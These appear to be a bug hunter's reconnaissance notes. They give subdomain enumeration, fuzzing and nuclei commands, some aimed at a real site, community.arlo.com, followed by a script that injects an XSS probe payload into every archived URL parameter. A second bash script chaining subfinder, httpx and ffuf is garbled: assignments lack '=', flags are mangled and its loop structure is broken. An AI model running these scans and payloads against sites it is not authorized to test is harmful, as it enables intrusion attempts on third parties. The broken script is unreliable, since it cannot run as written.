subfinder 

subfinder -d $URL -o subdomains.txt -all

httpx 

httpx -l subdomains.txt -o alive.txt

Nuclei 

using txt file : nuclei -l subdomains.txt -o nuclei
using url : nuclei -u $URL

fuff 
https://community.arlo.com:80/FUZZ
file discovery :  ffuf -u -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403
https://community.arlo.com:80/FUZZ
Directory Discovery : wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 301,404,403 -u $url
Parameter Discovery : wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 301,404 -u $url
https://community.arlo.com:80/index.php?name=FUZZ
parameter Values : wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 -u $url





#!/bin/bash

echo "[+] Running waybackurls"
waybackurls $1 > archive_links
echo "[+] Running gau"
gau $1 >> archive_links
sort -u archive_links -o archive_links
cat archive_links | uro | tee -a archive_links_uro
echo "[+] Starting qsreplace and freq"
cat archive_links_uro | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | tee -a freq_output | grep -iv "Not Vulnerable" | tee -a freq_xss_findings
echo "[+] Script Execution Ended"





#!/bin/bash

# Read the list of wildcard domains from an input file

read -p "Enter the input file name containing wildcard domains: " input_file

# File names

subdomains_file="subdomains.txt"

alivesubdomains_file "alivesubdomains.txt"

all_urls_file="all-urls.txt"

all_alive_paths_file "all-alivepaths.txt"

# Perform subdomain enumeration and save the results cat "$input_file" | while read -r domain; do echo "Enumerating subdomains for $domain" done

subfinder -d "$domain" >> "$subdomains_file" assetfinder--subs-only "$domain" >> "$subdomains_file"

# Filter and verify the status code of subdomains using httpx cat "$subdomains_file" | httpx -silent -status-code -o "$alivesubdomains_file"

# Use waybackurls against the alive subdomains and save the results cat "$alivesubdomains_file" | waybackurls >> "$all_urls_file"

# Perform mass directory bruteforcing on each subdomain

extensions=".php, .txt,.jsp,.aspx, .zip,.sql, .bak,.js,.json,.html"

echo "Running directory brute force on $subdomain"

while read r subdomain; do ffuf - files.txt -u "https://$subdomain/FUZZ$extensions" -mc 200 - "$all_alive_paths_file"

done < "$alivesubdomains_file"
